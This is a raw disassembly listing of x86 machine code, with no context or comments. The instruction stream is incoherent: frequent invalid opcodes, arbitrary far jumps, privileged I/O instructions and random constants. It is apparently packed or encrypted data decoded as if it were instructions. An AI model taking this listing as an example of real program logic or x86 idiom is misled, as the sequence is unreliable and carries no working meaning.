  4156a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a5:	push   0xffffffea
  4156a7:	(bad)  
  4156a8:	mov    ds:0x6bdbbd13,eax
  4156ad:	xor    BYTE PTR ds:0xe117d6c9,0x43
  4156b4:	cmp    bh,BYTE PTR ds:0x3f89a26
  4156ba:	imul   eax,ecx,0xffffffcb
  4156bd:	xor    bl,BYTE PTR [eax]
  4156bf:	sub    al,0xc6
  4156c1:	cmp    al,0x7f
  4156c3:	push   0x33
  4156c5:	pop    esi
  4156c6:	lock mov esi,0x30d3c242
  4156cc:	sbb    eax,0xfd1f7daa
  4156d1:	addr16 sti 
  4156d3:	int3   
  4156d4:	test   DWORD PTR ds:0xb1f29982,ebx
  4156da:	call   0x3aef:0x4f15511a
  4156e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156e2:	sub    DWORD PTR [ebx-0x4845a065],esi
  4156e8:	jns    0x4156ab
  4156ea:	dec    ecx
  4156eb:	xchg   BYTE PTR [ebx+0x16],bh
  4156ee:	int    0xe8
  4156f0:	inc    edx
  4156f1:	ficom  DWORD PTR [ebx-0x2a4cc42]
  4156f7:	mov    ebx,0xbb078c58
  4156fc:	hlt    
  4156fd:	add    edx,ebp
  4156ff:	addr16 mov dh,0x81
  415702:	shl    edi,1
  415704:	adc    BYTE PTR [ebp+0x9],bl
  415707:	push   0x3873b676
  41570c:	sub    esp,0x1c08fcce
  415712:	xchg   DWORD PTR [edi+ebp*2-0x6d13a0b9],ebx
  415719:	leave  
  41571a:	and    ecx,0xf60db507
  415720:	fidivr WORD PTR [eax-0x25863d03]
  415726:	cdq    
  415727:	jge    0x41571f
  415729:	(bad)  
  41572b:	inc    edx
  41572c:	pusha  
  41572d:	xchg   ecx,eax
  41572e:	out    0xf0,al
  415730:	inc    esi
  415731:	xchg   ebp,eax
  415732:	pop    ebp
  415733:	ds inc ebx
  415735:	aaa    
  415736:	les    ebx,FWORD PTR [edx-0x38]
  415739:	out    0xe1,eax
  41573b:	test   BYTE PTR [edx],dh
  41573d:	jo     0x4156e5
  41573f:	dec    edx
  415740:	push   eax
  415741:	and    BYTE PTR [ebp+0x3b6dc708],0x28
  415748:	sub    ebp,0x2
  41574b:	retf   
  41574c:	adc    al,0x8d
  41574e:	test   al,0xe6
  415750:	mov    ebx,0xb19d4441
  415755:	mov    ds:0x1594b7d7,eax
  41575a:	fild   WORD PTR [edi-0x14]
  41575d:	arpl   si,sp
  41575f:	mov    dl,0x2
  415761:	mov    bh,0x51
  415763:	nop
  415764:	or     esi,eax
  415766:	into   
  415767:	ficom  DWORD PTR [ebx+0x6a]
  41576a:	adc    eax,0xe62ba981
  41576f:	adc    al,0x20
  415771:	imul   BYTE PTR [eax]
  415773:	dec    ecx
  415774:	mov    ah,0xb0
  415776:	popf   
  415777:	and    eax,0x870e8f35
  41577c:	retf   
  41577d:	xchg   ebp,eax
  41577e:	dec    ecx
  41577f:	das    
  415780:	arpl   WORD PTR [esi],ax
  415782:	shl    edx,0xae
  415785:	xor    al,BYTE PTR [edx-0x13b5e931]
  41578b:	rcr    BYTE PTR [eax+0x60],0x8a
  41578f:	inc    ecx
  415790:	sbb    DWORD PTR [ecx],ecx
  415792:	test   BYTE PTR [ebx],0x93
  415795:	add    ebx,DWORD PTR [ebx+0x45b2327e]
  41579b:	(bad)  
  41579c:	punpcklbw mm0,DWORD PTR [edi-0x571c3494]
  4157a3:	mov    al,ds:0xa7b59cdb
  4157a8:	aad    0x44
  4157aa:	shl    DWORD PTR ds:0x25130cd0,0xc9
  4157b1:	shr    DWORD PTR [eax+0x3c57548a],1
  4157b7:	sub    esi,0xfa3b86c2
  4157bd:	dec    DWORD PTR [ebx]
  4157bf:	lea    eax,es:[ecx+0x7d]
  4157c3:	pop    edi
  4157c4:	jmp    0xd860:0xba52f949
  4157cb:	arpl   WORD PTR [ebx+ebp*4-0x8eeb549],di
  4157d2:	fprem  
  4157d4:	cli    
  4157d5:	sti    
  4157d6:	cmp    al,0x7a
  4157d8:	or     DWORD PTR [ebx+eiz*2+0xae24ba6],esi
  4157df:	sbb    bl,BYTE PTR [esi]
  4157e1:	dec    esp
  4157e2:	rol    DWORD PTR [eax],0x74
  4157e5:	sbb    al,0xcb
  4157e7:	mov    eax,ds:0xa00ed9c6
  4157ec:	xor    dh,dh
  4157ee:	pop    esi
  4157ef:	inc    edi
  4157f0:	fistp  WORD PTR [ecx+0x71]
  4157f3:	xchg   ebp,eax
  4157f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157f5:	dec    edi
  4157f6:	pusha  
  4157f7:	out    0xeb,al
  4157f9:	mov    edi,0xf60a791e
  4157fe:	rcl    DWORD PTR [esi-0x5e],1
  415801:	(bad)  
  415802:	cmp    al,0xe7
  415804:	retf   
  415805:	xchg   edi,eax
  415806:	jbe    0x41586e
  415808:	jmp    0x415853
  41580a:	adc    ah,BYTE PTR [edx-0x439f6933]
  415810:	(bad)  
  415811:	mov    BYTE PTR [edx+0x6d],0xda
  415815:	jp     0x41585d
  415817:	repz cs jl 0x415866
  41581b:	aam    0xd1
  41581d:	enter  0xbfd8,0x6
  415821:	retf   
  415822:	xchg   ecx,eax
  415823:	stos   DWORD PTR es:[di],eax
  415825:	les    esi,FWORD PTR [ebx-0x65580eba]
  41582b:	dec    esp
  41582c:	and    ch,al
  41582e:	jp     0x415830
  415830:	out    dx,eax
  415831:	into   
  415832:	retf   
  415833:	mov    dh,0x94
  415835:	dec    edi
  415836:	push   ebx
  415837:	in     eax,0x43
  415839:	sbb    al,0x2
  41583b:	std    
  41583c:	sub    DWORD PTR [eax],edx
  41583e:	adc    DWORD PTR [edi+edi*4+0x29d47509],edx
  415845:	dec    ebx
  415846:	ins    DWORD PTR es:[edi],dx
  415847:	mov    ebp,ebx
  415849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584a:	pusha  
  41584b:	mov    dh,0x4
  41584d:	repz mov bl,0xfc
  415850:	stos   BYTE PTR es:[edi],al
  415851:	gs retf 
  415853:	shl    BYTE PTR [edx+0x42],1
  415856:	shufps xmm3,XMMWORD PTR [edx+0x17519347],0xfd
  41585e:	adc    DWORD PTR [ebx],esi
  415860:	xor    eax,0x72586d03
  415865:	iret   
  415866:	jp     0x41585d
  415868:	(bad)  
  415869:	in     eax,dx
  41586a:	xchg   ebx,eax
  41586b:	add    sp,WORD PTR [edi]
  41586e:	adc    DWORD PTR [edx+esi*2],0x23fdd261
  415875:	imul   DWORD PTR [edx]
  415877:	ja     0x41582e
  415879:	aad    0xbe
  41587b:	fidiv  WORD PTR [edi+esi*2-0x486e41a2]
  415882:	add    bh,BYTE PTR [ecx-0x16]
  415885:	iret   
  415886:	fdivr  st(0),st
  415888:	(bad)  [edx]
  41588a:	jae    0x41586d
  41588c:	fisttp DWORD PTR [esi-0x14c9da6f]
  415892:	mov    cl,0x6e
  415894:	sbb    dh,BYTE PTR [ecx+0x4b]
  415897:	rol    BYTE PTR [edx+0xd],0xe9
  41589b:	jo     0x4158cf
  41589d:	scas   al,BYTE PTR es:[edi]
  41589e:	(bad)  
  4158a0:	xchg   BYTE PTR [edx-0x1d05795],dh
  4158a6:	enter  0xd546,0xed
  4158aa:	fisub  DWORD PTR [eax-0x33]
  4158ad:	js     0x415900
  4158af:	retf   0x7f0a
  4158b2:	mov    dl,0xee
  4158b4:	rcr    edi,1
  4158b6:	scas   eax,DWORD PTR es:[edi]
  4158b7:	xchg   ecx,eax
  4158b8:	sahf   
  4158b9:	je     0x415897
  4158bb:	or     DWORD PTR [esi-0x46],ecx
  4158be:	mov    eax,0x9ef1ff16
  4158c3:	dec    ecx
  4158c4:	sub    eax,0xad2f10e8
  4158c9:	mov    esi,0x4e523f0
  4158ce:	enter  0xa956,0x3a
  4158d2:	push   es
  4158d3:	xchg   ecx,eax
  4158d4:	sub    al,BYTE PTR [ebx+0x16]
  4158d7:	pop    ebp
  4158d8:	xchg   edx,eax
  4158d9:	adc    eax,0xfff16d37
  4158de:	xchg   edx,ecx
  4158e0:	jle    0x41592e
  4158e2:	xchg   ecx,eax
  4158e3:	idiv   eax
  4158e5:	xor    DWORD PTR [ebx],edi
  4158e7:	das    
  4158e8:	aas    
  4158e9:	inc    edi
  4158ea:	push   edx
  4158eb:	les    esi,FWORD PTR [esi]
  4158ed:	or     BYTE PTR [edi-0x20],ch
  4158f0:	push   cs
  4158f1:	inc    ecx
  4158f2:	xor    BYTE PTR [eax],bh
  4158f4:	xor    al,BYTE PTR [eax-0x36]
  4158f7:	(bad)  
  4158f8:	hlt    
  4158f9:	and    eax,0xe626a3ae
  4158fe:	xchg   ebx,eax
  4158ff:	dec    ebp
  415900:	xlat   BYTE PTR ds:[ebx]
  415901:	mov    al,0x6
  415903:	or     ebx,DWORD PTR [esi+0x1b]
  415906:	sub    al,0x43
  415908:	fucomp st(0)
  41590a:	gs loope 0x415985
  41590d:	dec    eax
  41590e:	popa   
  41590f:	sti    
  415910:	ins    DWORD PTR es:[edi],dx
  415911:	adc    BYTE PTR ss:[ecx],bh
  415914:	xlat   BYTE PTR ds:[ebx]
  415915:	or     DWORD PTR [eax],ebx
  415917:	sbb    edi,eax
  415919:	sbb    bl,bh
  41591b:	cvtpi2ps xmm3,QWORD PTR [ecx-0x20407fa4]
  415922:	jp     0x415974
  415924:	add    ebx,DWORD PTR [ebx+0x3c]
  415927:	sub    BYTE PTR [edx],0xd
  41592a:	imul   edi,DWORD PTR [eax+0x1a80fb73],0x8c2eb8d0
  415934:	not    DWORD PTR [ecx+0x74]
  415937:	(bad)
  41593b:	retf   
  41593c:	jg     0x41590a
  41593e:	mov    WORD PTR [eax-0x24],es
  415941:	mov    edi,0xb9cb9431
  415946:	outs   dx,BYTE PTR ds:[esi]
  415947:	add    al,0xb3
  415949:	dec    ebp
  41594a:	in     eax,0xd3
  41594c:	call   0x21a2:0x7cfb3420
  415953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415954:	sahf   
  415955:	mov    edi,DWORD PTR [eax+0x16868e51]
  41595b:	sbb    eax,0x5212aeae
  415960:	lahf   
  415961:	aam    0x37
  415963:	adc    eax,0x5a06299b
  415968:	loopne 0x415951
  41596a:	add    BYTE PTR [eax-0x5946f39a],bh
  415970:	mov    dl,0x4d
  415972:	stc    
  415973:	xchg   DWORD PTR [eax+0x52e33877],ebp
  415979:	call   0x6c2a5c86
  41597e:	in     eax,dx
  41597f:	fisttp DWORD PTR [ebp-0x2f]
  415982:	fistp  QWORD PTR [eax-0x49c9da1e]
  415988:	dec    ebp
  415989:	add    DWORD PTR [eax],eax
  41598b:	mov    al,ds:0x83e03bef
  415990:	lods   eax,DWORD PTR ds:[esi]
  415991:	inc    ecx
  415992:	dec    esi
  415993:	es and eax,0x857196fb
  415999:	mov    dh,0xec
  41599b:	adc    ch,BYTE PTR [eax]
  41599d:	sbb    esp,DWORD PTR [esi]
  41599f:	jmp    0x57cf:0x5d676e4e
  4159a6:	sub    BYTE PTR [ecx-0x42],al
  4159a9:	push   ebx
  4159aa:	xlat   BYTE PTR ds:[ebx]
  4159ab:	mov    ch,0x57
  4159ad:	out    0x86,al
  4159af:	jno    0x4159b5
  4159b1:	xchg   edi,eax
  4159b2:	mov    BYTE PTR [edx+0x39],dl
  4159b5:	cwde   
  4159b6:	shl    BYTE PTR [ecx+0x18fb6ebc],cl
  4159bc:	inc    ebx
  4159bd:	in     al,0xcb
  4159bf:	les    ebx,FWORD PTR [ebx]
  4159c1:	jo     0x415a0c
  4159c3:	or     DWORD PTR [eax-0x7f],edx
  4159c6:	sub    DWORD PTR [edi+eiz*4-0x4e],ebx
  4159ca:	xchg   BYTE PTR [edx],bh
  4159cc:	xchg   DWORD PTR ds:0x95debc6a,edx
  4159d2:	icebp  
  4159d3:	stc    
  4159d4:	rol    bl,1
  4159d6:	in     al,0x2b
  4159d8:	pop    ebp
  4159d9:	add    DWORD PTR [edi+0xa70ab],esp
  4159df:	(bad)  
  4159e0:	aas    
  4159e1:	lea    esp,[edx*2+0x6617513d]
  4159e8:	(bad)  
  4159e9:	popa   
  4159ea:	test   bl,dl
  4159ec:	sub    esp,DWORD PTR [edx]
  4159ee:	jne    0x415995
  4159f0:	fstp   DWORD PTR [ebx+0x1aab78b3]
  4159f6:	push   es
  4159f7:	aaa    
  4159f8:	xlat   BYTE PTR ds:[ebx]
  4159f9:	inc    edi
  4159fa:	cmp    eax,DWORD PTR [ebp-0x6b6979b4]
  415a00:	pop    edi
  415a01:	repz in al,dx
  415a03:	lock daa 
  415a05:	sub    BYTE PTR [edx],bl
  415a07:	fdiv   st,st(3)
  415a09:	jmp    0x8d2:0xc91a0427
  415a10:	mov    al,0x29
  415a12:	lahf   
  415a13:	bound  ecx,QWORD PTR [esi+ecx*1+0x2ef03a20]
  415a1a:	jmp    0xe7e98900
  415a1f:	scas   eax,DWORD PTR es:[edi]
  415a20:	mov    ds:0x1fab849e,eax
  415a25:	ins    BYTE PTR es:[edi],dx
  415a26:	arpl   WORD PTR [esi],sp
  415a28:	mov    bh,0x89
  415a2a:	jecxz  0x415a95
  415a2c:	xor    edi,DWORD PTR [eax+0xb]
  415a2f:	xchg   edx,eax
  415a30:	xchg   ebx,eax
  415a31:	cmc    
  415a32:	icebp  
  415a33:	scas   eax,DWORD PTR es:[edi]
  415a34:	mov    bl,0xab
  415a36:	xor    eax,0x4099a469
  415a3b:	mov    edi,0x8a94da03
  415a40:	fdivp  st(1),st
  415a42:	xor    bh,BYTE PTR [esi]
  415a44:	mov    BYTE PTR [esi],bl
  415a46:	retf   
  415a47:	addr16 jne 0x415a96
  415a4a:	stos   BYTE PTR es:[edi],al
  415a4b:	and    edx,esp
  415a4d:	jle    0x415a20
  415a4f:	mov    ecx,DWORD PTR ds:0xc06142b3
  415a55:	scas   al,BYTE PTR es:[edi]
  415a56:	xchg   esi,eax
  415a57:	in     al,dx
  415a58:	mov    bl,0xd0
  415a5a:	mov    dl,0x57
  415a5c:	rcl    BYTE PTR [esi-0x60],1
  415a5f:	push   ecx
  415a60:	sub    ch,dh
  415a62:	test   al,0x39
  415a64:	or     BYTE PTR [edx],bl
  415a66:	lea    edi,[esi+0x33de7c7b]
  415a6c:	push   edi
  415a6d:	dec    esi
  415a6e:	xchg   DWORD PTR [ebx-0x1c],esi
  415a71:	or     al,0x94
  415a73:	push   ss
  415a74:	jbe    0x415ad2
  415a76:	fcom   QWORD PTR [ecx]
  415a78:	and    DWORD PTR [ebp+0x5431ca2f],edx
  415a7e:	retf   
  415a7f:	inc    esi
  415a80:	fs aad 0xb2
  415a83:	shr    DWORD PTR [ebx],cl
  415a85:	jle    0x415a59
  415a87:	xchg   BYTE PTR [edi-0x5f],cl
  415a8a:	daa    
  415a8b:	mov    esi,0x6327fb3b
  415a90:	sub    edi,ebx
  415a92:	jnp    0x415a84
  415a94:	out    dx,eax
  415a95:	push   eax
  415a96:	repnz sbb al,0x79
  415a99:	jns    0x415ae3
  415a9b:	and    ecx,0x9ec63686
  415aa1:	or     BYTE PTR [ecx-0x5e],ah
  415aa4:	stos   BYTE PTR es:[edi],al
  415aa5:	or     eax,0xe753641f
  415aaa:	and    dh,BYTE PTR [eax-0x62a3527a]
  415ab0:	nop
  415ab1:	sahf   
  415ab2:	jp     0x415a73
  415ab4:	ret    
  415ab5:	call   0xed74:0xefd9ece
  415abc:	and    dl,dl
  415abe:	inc    ebp
  415abf:	mov    edx,0xfc318f77
  415ac4:	add    esi,DWORD PTR [edx+0x38]
  415ac7:	push   esi
  415ac8:	mov    ah,0x95
  415aca:	or     dl,ch
  415acc:	cs jbe 0x415aa4
  415acf:	call   0x9ea0:0xeea9a3f6
  415ad6:	std    
  415ad7:	push   es
  415ad8:	mov    dh,0x32
  415ada:	daa    
  415adb:	loope  0x415a9d
  415add:	inc    ebp
  415ade:	jge    0x415a82
  415ae0:	pop    eax
  415ae1:	xchg   DWORD PTR [ebx],eax
  415ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae4:	sbb    edx,DWORD PTR ds:[eax+0x4]
  415ae8:	jp     0x415afb
  415aea:	retf   
  415aeb:	mov    esi,0x8b2c296c
  415af0:	and    eax,0xc5b09229
  415af5:	sbb    edx,ecx
  415af7:	xchg   ecx,eax
  415af8:	mov    ecx,0x27035cbd
  415afd:	pop    ebx
  415afe:	add    ah,ah
  415b00:	and    al,0x90
  415b02:	push   0x31
  415b04:	imul   ebp,eax,0x718152eb
  415b0a:	adc    ebx,DWORD PTR [ebx]
  415b0c:	imul   edx,edx,0xc877fa6d
  415b12:	mov    edi,0x5514ce11
  415b17:	mov    bh,BYTE PTR [ebx+eax*4]
  415b1a:	sub    DWORD PTR [edx-0x2e],esi
  415b1d:	out    0xd5,al
  415b1f:	push   ecx
  415b20:	inc    ebp
  415b21:	cmp    DWORD PTR [edx+edi*1-0x1e],0xca4fdaaf
  415b29:	test   BYTE PTR [edx],ch
  415b2b:	(bad)  
  415b2c:	addr16 adc al,0xe9
  415b2f:	lods   al,BYTE PTR ds:[esi]
  415b30:	in     eax,dx
  415b31:	jns    0x415ac4
  415b33:	arpl   WORD PTR [ebp-0x5549d64f],cx
  415b39:	jecxz  0x415b74
  415b3b:	in     eax,dx
  415b3c:	retf   
  415b3d:	ds mov ebx,0x73a71ea8
  415b43:	fnsave ds:0x788f6819
  415b49:	ds inc esp
  415b4b:	loope  0x415af8
  415b4d:	add    BYTE PTR [ebx],ah
  415b4f:	xchg   ebx,eax
  415b50:	dec    ebp
  415b51:	mov    DWORD PTR [eax+edi*2],ebp
  415b54:	jl     0x415b50
  415b56:	fnstenv [edx-0x1c8760b9]
  415b5c:	scas   al,BYTE PTR es:[edi]
  415b5d:	sbb    BYTE PTR [ebp+0x6f],cl
  415b60:	jb     0x415b14
  415b62:	popf   
  415b63:	into   
  415b64:	fld    TBYTE PTR [ebx-0x7]
  415b67:	call   0x6fde:0x580c818d
  415b6e:	sub    DWORD PTR [ecx+0x57],0xffffffe7
  415b72:	and    ch,BYTE PTR [eax-0x3bfccf35]
  415b78:	adc    esp,ebp
  415b7a:	mov    edx,0x29398b69
  415b7f:	mov    al,BYTE PTR [esi]
  415b81:	or     eax,0x3b46ce3
  415b86:	bound  edi,QWORD PTR [edx]
  415b88:	call   0x22d6d094
  415b8d:	push   esp
  415b8e:	jmp    0x2955:0xe1848847
  415b95:	aas    
  415b96:	add    BYTE PTR [esi+0x2d],bh
  415b99:	sub    al,0x12
  415b9b:	xchg   BYTE PTR [eax+0x36e297d1],ch
  415ba1:	mov    ds,WORD PTR [ebx]
  415ba3:	sbb    DWORD PTR [edx-0x35],edx
  415ba6:	xor    esp,DWORD PTR [edx]
  415ba8:	enter  0xf331,0x2d
  415bac:	(bad)  
  415bad:	push   eax
  415bae:	nop
  415baf:	ja     0x415b7e
  415bb1:	adc    al,0x47
  415bb3:	jecxz  0x415bdb
  415bb5:	in     al,0xcb
  415bb7:	das    
  415bb8:	add    dh,BYTE PTR [edi-0x80]
  415bbb:	mov    ebx,0x644af8a5
  415bc0:	ret    
  415bc1:	pop    esp
  415bc2:	fs jmp 0x2635d872
  415bc8:	mov    al,ds:0x847a732
  415bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bce:	and    BYTE PTR [esi+ecx*1-0x7da5d806],dl
  415bd5:	aad    0xef
  415bd7:	fcmovbe st,st(6)
  415bd9:	enter  0xa633,0x1e
  415bdd:	xor    al,0xd1
  415bdf:	out    0xf2,al
  415be1:	aas    
  415be2:	pop    es
  415be3:	pop    eax
  415be4:	push   0xc27aa88a
  415be9:	leave  
  415bea:	mov    edx,?
  415bec:	xor    ebp,edx
  415bee:	xchg   edx,eax
  415bef:	cld    
  415bf0:	adc    BYTE PTR [ebx-0x7f10b1f0],dl
  415bf6:	int    0xe2
  415bf8:	outs   dx,BYTE PTR ds:[esi]
  415bf9:	lock adc edx,edx
  415bfc:	ins    DWORD PTR es:[edi],dx
  415bfd:	pop    ss
  415bfe:	in     eax,0xb4
  415c00:	(bad)  
  415c01:	(bad)
  415c04:	fstp   DWORD PTR [edi]
  415c06:	mov    DWORD PTR [edx-0x20c07ccd],esi
  415c0c:	jb     0x415c43
  415c0e:	sub    DWORD PTR [esi-0x80],edi
  415c11:	mov    ds:0x1e56fc28,eax
  415c16:	out    dx,eax
  415c17:	(bad)  
  415c18:	sbb    edi,edx
  415c1a:	ds jb  0x415bf4
  415c1d:	popa   
  415c1e:	out    dx,eax
  415c1f:	jp     0x415ba9
  415c21:	rcr    BYTE PTR [eax],0xd1
  415c24:	stos   BYTE PTR es:[edi],al
  415c25:	xchg   ecx,eax
  415c26:	mov    ch,0x51
  415c28:	ins    DWORD PTR es:[edi],dx
  415c29:	xchg   esi,eax
  415c2a:	icebp  
  415c2b:	mov    bl,0x75
  415c2d:	sahf   
  415c2e:	(bad)  
  415c2f:	loope  0x415c15
  415c31:	inc    esp
  415c32:	retf   0xde93
  415c35:	adc    eax,0xababebf6
  415c3a:	and    BYTE PTR [ebp-0x392f6cea],bl
  415c40:	and    BYTE PTR [ebx],bl
  415c42:	aad    0xe6
  415c44:	pop    ss
  415c45:	cld    
  415c46:	mov    al,ds:0xd2522cc6
  415c4b:	out    dx,al
  415c4c:	cmp    ebp,DWORD PTR [ebp+0x5]
  415c4f:	fld    st(2)
  415c51:	sub    DWORD PTR ds:0x829853c3,ebp
  415c57:	test   DWORD PTR [ebx-0x31246564],edi
  415c5d:	or     ebp,0x6f
  415c60:	mov    DWORD PTR [esi+eiz*4+0x4fec7239],ecx
  415c67:	mov    ah,0x5f
  415c69:	mov    ah,0x48
  415c6b:	jne    0x415ccf
  415c6d:	sub    al,ch
  415c6f:	mov    ecx,0xd62b4f7b
  415c74:	and    DWORD PTR [esi],ebp
  415c76:	sbb    BYTE PTR [edx+0x53],dl
  415c79:	fiadd  DWORD PTR [edi+0x5a1737f8]
  415c7f:	xchg   esp,eax
  415c80:	cld    
  415c81:	repz xor eax,0x2b7dd439
  415c87:	ja     0x415c67
  415c89:	cmp    eax,0xc5ae93b6
  415c8e:	fstp   TBYTE PTR [esi-0x2e93318a]
  415c94:	mov    ds:0x33c7eb3b,eax
  415c99:	fadd   DWORD PTR [ebx]
  415c9b:	imul   eax,DWORD PTR [edx],0x6b
  415c9e:	cmp    al,0x9c
  415ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca1:	mov    ch,0xd7
  415ca3:	lds    esp,FWORD PTR [ecx-0x7b]
  415ca6:	jge    0x415cf8
  415ca8:	dec    esi
  415ca9:	iret   
  415caa:	mov    dh,0xe3
  415cac:	(bad)  
  415cad:	std    
  415cae:	aad    0x32
  415cb0:	add    al,0xe1
  415cb2:	enter  0x911b,0x65
  415cb6:	dec    edx
  415cb7:	(bad)  
  415cb8:	pop    esp
  415cb9:	jl     0x415cd3
  415cbb:	icebp  
  415cbc:	push   edi
  415cbd:	mov    BYTE PTR [edx],dl
  415cbf:	cwde   
  415cc0:	enter  0xcb5e,0xc5
  415cc4:	jmp    0xae2b:0x602b9b1a
  415ccb:	in     eax,0xf5
  415ccd:	inc    esp
  415cce:	jecxz  0x415ca9
  415cd0:	(bad)  
  415cd1:	aad    0x4b
  415cd3:	xchg   ecx,eax
  415cd4:	sbb    al,0x73
  415cd6:	fcomp  DWORD PTR [esi]
  415cd8:	adc    dh,dl
  415cda:	push   ss
  415cdb:	stc    
  415cdc:	sub    eax,0x4353e5c5
  415ce1:	dec    esi
  415ce2:	pop    ss
  415ce3:	mov    ecx,0x365aed9c
  415ce8:	pop    ebx
  415ce9:	pop    esi
  415cea:	dec    edx
  415ceb:	fisttp WORD PTR [edx-0x11834200]
  415cf1:	das    
  415cf2:	xchg   ebp,eax
  415cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf4:	add    eax,DWORD PTR [ecx]
  415cf6:	push   ebp
  415cf7:	aam    0x38
  415cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cfa:	xlat   BYTE PTR ds:[ebx]
  415cfb:	cli    
  415cfc:	mov    esi,0x4f92b547
  415d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d02:	pusha  
  415d03:	pop    edi
  415d04:	xchg   edx,eax
  415d05:	mov    gs,WORD PTR [esi+eax*1-0x5d29dc99]
  415d0c:	jne    0x415d81
  415d0e:	dec    edx
  415d0f:	mov    ecx,0xbdb4878b
  415d14:	cmp    ebp,esp
  415d16:	mov    bh,0x2c
  415d18:	push   eax
  415d19:	add    bh,BYTE PTR [edi]
  415d1b:	and    eax,0x3b3ab993
  415d20:	pop    edi
  415d21:	jp     0x415cd0
  415d23:	mov    ds:0xe262fb28,al
  415d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d29:	cmp    al,0x9e
  415d2b:	out    dx,eax
  415d2c:	jbe    0x415cae
  415d2e:	jge    0x415d3f
  415d30:	(bad)  
  415d31:	mov    ebx,0x7f6e6ec0
  415d36:	stos   BYTE PTR es:[edi],al
  415d37:	pop    edx
  415d38:	xor    al,0x91
  415d3a:	and    dh,BYTE PTR [ebx-0x12]
  415d3d:	cmc    
  415d3e:	mov    DWORD PTR [ebx+0x642c9185],edx
  415d44:	(bad)  
  415d45:	pop    es
  415d46:	or     ebp,DWORD PTR [ebp+0x16]
  415d49:	mov    ds:0x36a48149,al
  415d4e:	xchg   edi,eax
  415d4f:	adc    BYTE PTR [ebx-0x62cc6970],ah
  415d55:	retf   0x45e5
  415d58:	rcl    BYTE PTR [edi+esi*1+0x2842790f],1
  415d5f:	mov    ds,ecx
  415d61:	sahf   
  415d62:	jne    0x415cfd
  415d64:	xor    DWORD PTR [edi],edx
  415d66:	adc    ebp,edi
  415d68:	mov    eax,0xc853cb51
  415d6d:	push   0x5b
  415d6f:	scas   eax,DWORD PTR es:[edi]
  415d70:	outs   dx,DWORD PTR ds:[esi]
  415d71:	inc    esi
  415d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d73:	sub    dl,BYTE PTR [esi+0x52]
  415d76:	pop    es
  415d77:	cmc    
  415d78:	push   es
  415d79:	or     BYTE PTR [ecx+0x317c7038],0x1c
  415d80:	stos   BYTE PTR es:[edi],al
  415d81:	aas    
  415d82:	pop    ds
  415d83:	ins    BYTE PTR es:[edi],dx
  415d84:	jbe    0x415d91
  415d86:	int3   
  415d87:	fcmovb st,st(2)
  415d89:	call   0xa7bc:0xd4f25b
  415d90:	xor    ebx,esi
  415d92:	mov    al,ds:0x18337d6b
  415d97:	jno    0x415da8
  415d99:	rcr    DWORD PTR [edi-0x45],0x28
  415d9d:	and    al,0xee
  415d9f:	dec    ecx
  415da0:	xor    eax,0xf119f316
  415da5:	fiadd  DWORD PTR [eax-0x1a]
  415da8:	mov    ss,WORD PTR [ebx+0x177b49d4]
  415dae:	stc    
  415daf:	push   ds
  415db0:	sbb    ebp,DWORD PTR [eax+0x584d2851]
  415db6:	pop    ebp
  415db7:	fs fsub st,st(4)
  415dba:	retf   
  415dbb:	jl     0x415d84
  415dbd:	pop    ebx
  415dbe:	int    0xd3
  415dc0:	dec    ebp
  415dc1:	clc    
  415dc2:	sbb    eax,edx
  415dc4:	ins    DWORD PTR es:[edi],dx
  415dc5:	(bad)  
  415dc7:	das    
  415dc8:	dec    esp
  415dc9:	xchg   edi,eax
  415dca:	mov    esi,0x227ab701
  415dcf:	popa   
  415dd0:	scas   eax,DWORD PTR es:[edi]
  415dd1:	je     0x415dc8
  415dd3:	inc    eax
  415dd4:	jmp    0x7fd29bff
  415dd9:	jg     0x415e0b
  415ddb:	pop    edx
  415ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ddd:	add    bl,BYTE PTR [ebx+0x72f8b3cc]
  415de3:	mov    eax,ds:0xc4b71594
  415de8:	not    BYTE PTR [eax]
  415dea:	cmc    
  415deb:	dec    eax
  415dec:	or     DWORD PTR [ebp-0x3f],ecx
  415def:	push   esi
  415df0:	inc    esp
  415df1:	retf   0xd489
  415df4:	dec    ebx
  415df5:	call   0x945056ed
  415dfa:	and    eax,0x30176ac0
  415dff:	shl    BYTE PTR [edx-0x423923ee],0x89
  415e06:	fmul   DWORD PTR [ebx-0x4be63ef3]
  415e0c:	jle    0x415e61
  415e0e:	cmp    BYTE PTR [edx-0x62],dl
  415e11:	push   cs
  415e12:	pmulhuw mm2,QWORD PTR [ebx]
  415e15:	js     0x415d9c
  415e17:	cld    
  415e18:	push   ss
  415e19:	xor    DWORD PTR [edi],0x9
  415e1c:	push   ecx
  415e1d:	add    eax,0x6ae217ea
  415e22:	stos   DWORD PTR es:[edi],eax
  415e23:	mov    dl,0xe3
  415e25:	adc    ebp,DWORD PTR [esi-0x6e]
  415e28:	fwait
  415e29:	stc    
  415e2a:	and    ebp,ebx
  415e2c:	add    edx,edx
  415e2e:	ret    0xf761
  415e31:	xchg   bl,bl
  415e33:	adc    edx,ebx
  415e35:	xchg   edx,eax
  415e36:	cmp    eax,0x6939a1af
  415e3b:	fwait
  415e3c:	test   al,0x51
  415e3e:	shl    BYTE PTR [edx-0x18],cl
  415e41:	lock dec ecx
  415e43:	sub    BYTE PTR [edi+0x5a],bl
  415e46:	out    0xad,eax
  415e48:	fbld   TBYTE PTR [esi+0x21]
  415e4b:	mov    ebp,0x30b0d583
  415e50:	lods   eax,DWORD PTR ds:[esi]
  415e51:	ret    0x1324
  415e54:	sbb    esp,DWORD PTR cs:[ecx+ecx*1-0x5]
  415e59:	and    DWORD PTR [ecx],edx
  415e5b:	dec    esi
  415e5c:	outs   dx,DWORD PTR ds:[esi]
